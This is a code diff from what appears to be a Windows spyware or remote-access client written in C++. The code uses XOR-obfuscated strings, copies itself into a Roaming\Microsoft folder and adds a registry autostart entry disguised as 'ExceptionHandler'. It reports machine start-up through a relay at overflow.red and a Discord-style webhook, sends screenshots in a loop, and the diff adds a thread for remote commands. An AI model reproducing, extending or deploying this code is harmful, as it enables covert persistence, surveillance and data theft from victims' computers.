@@ -4,6 +4,7 @@
 #include <vector>
 #include <regex>
 #include <iostream>
+#include <thread>
 
 #include "..\utility\xor.hpp"
 #include "..\utility\requests.h"
@@ -20,7 +21,7 @@ namespace client {
 
 	std::string client_webhook_url = "";
 
-	void background_loop() {
+	void background() {
 		/* Load Webhook */
 		std::ifstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
 		if (file.good()) {
@@ -30,9 +31,12 @@ namespace client {
 
 		/* Determine If Ran From Startup */
 		auto uptime = std::chrono::milliseconds(GetTickCount64());
-		if ((uptime / 60000).count() <= 2) {
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+		if ((uptime / 1000).count() <= 120) {
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
+
+		/* Create Communication Thread */
+		std::thread coms(communication::handler_loop);
 
 		while (true) {
 			/* Send Screenshot */
@@ -47,7 +51,7 @@ namespace client {
 		}
 	}
 
-	void init_startup() {
+	void init() {
 		/* Make Copy To Roaming Microsoft Folder*/
 		try {
 			std::filesystem::copy(PROGRAM_NAME, helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
@@ -60,13 +64,13 @@ namespace client {
 		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
 
 		/* Run Normal Stuff */
-		start_client();
+		run();
 
 		/* Start Program */
 		helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
 	}
 
-	void start_client() {
+	void run() {
 		/* Create Client Channel */
 		auto title = client::functions::get_ip();
 		std::replace(title.begin(), title.end(), '.', ' ');
